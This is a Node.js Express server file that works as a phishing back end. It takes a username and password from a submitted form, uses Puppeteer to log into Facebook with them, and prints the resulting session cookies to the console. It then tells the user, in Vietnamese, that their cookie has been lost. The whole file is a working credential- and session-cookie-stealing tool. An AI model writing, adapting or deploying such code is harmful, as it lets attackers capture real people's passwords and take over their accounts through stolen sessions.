const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer')

const app = express();
app.set('view engine', 'ejs');
app.set('views', './views');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', function (req, res) {
	res.render('home');
})

app.post('/', function (req, res) {
	var username = req.body.username; 
	var password = req.body.password;

	let autoLogin = async() => {
	    const browser = await puppeteer.launch({
	        headless: false
	      })
	      const page = await browser.newPage()
	      await page.goto('https://www.facebook.com/login.php')

	      const USER_SELECTOR = '#email'
	      const PASSWORD_SELECTOR = '#pass'
	      const BUTTON_LOGIN_SELECTOR = '#loginbutton'
	      var pageTitle = await page.title();

	      console.log("1-"+pageTitle)

	    
	      await page.click(USER_SELECTOR)
	      await page.keyboard.type(username)

	      await page.click(PASSWORD_SELECTOR)
	      await page.keyboard.type(password)

	      await page.click(BUTTON_LOGIN_SELECTOR)

	      await page.waitForNavigation()
	      pageTitle = await page.title();
	      console.log("2-"+pageTitle)

	      if (pageTitle == "Đăng nhập Facebook | Facebook") {
	      	res.redirect(301, '/')
	      } else {
	      	const cookies = await page.cookies()
	      	console.log(cookies);
	      	cookies.forEach((cookie, i) => {

	      		console.log(cookie.name +'='+cookie.value + ';')

	      	})
	      	res.end('Đăng nhập thành công! Bạn đã bị mất cookie');
	      }



	}
	autoLogin()
})

app.listen(80);